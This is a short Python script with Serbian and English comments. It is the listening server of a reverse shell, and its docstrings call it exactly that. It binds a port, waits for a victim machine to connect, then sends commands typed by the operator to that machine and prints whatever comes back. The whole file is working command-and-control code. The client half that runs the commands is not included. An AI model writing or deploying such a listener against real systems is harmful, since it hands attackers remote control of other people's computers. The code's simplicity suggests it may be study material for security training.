import socket
import sys


def socket_create():

    """
    Funkciaj kreira soken preko kog ce se uspostaviti veza
    "Creates a socket for the reverse shell"
    :return:
    """

    try:
        global host
        global port
        global s
        host = ''
        port = 6769
        s = socket.socket()
    except socket.error as msg:
        print(f"Socket error: {str(msg)}")

def socket_bind():

    """
    Kreiramo mesto za osluskavanje uz pomoc porta i socketa
    `Binding our socket to the port and waiting for connections`

    Ex: Pokusava 5 puta da se poveze ako ne uspe 5 put dropuje konekciju
    `It will try to connect 5 times before droping the connections`

    :return:
    """

    try:
        global host
        global port
        global s
        print(f"Binding to port [{str(port)}]")
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print(f"Binding error: {str(msg)} (Retrying....)")



def socket_accept():
    """
    Funkciaj prihvata konekcije, da bi ovo bilo moguce moramo pozvati `listen()`
    kao sto je i uradjeno u `socket_bind()`

    `Accepts connections from clients`

    :return:
    """
    conn, adress = s.accept()
    print(f"Connection has been estalished IP [{str(adress[0])}]  Port [{str(adress[1])}]")
    send_commands(conn)
    conn.close()


def send_commands(conn):

    """
    Funkcija se koristi za komuniciranje sa racunarom od klijenta i slanje komandi
    `Function sends commands to the client to execute`

    :param conn: Objekat uspostvaljene konekcije
    :param conn: `Connectio object`
    :return:
    """

    cmd =''
    while cmd!= "quit":
        cmd = input("Insert comand: ")
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")

    conn.close()
    s.close()
    sys.exit()


def main():
    socket_create()
    socket_bind()
    socket_accept()


main()
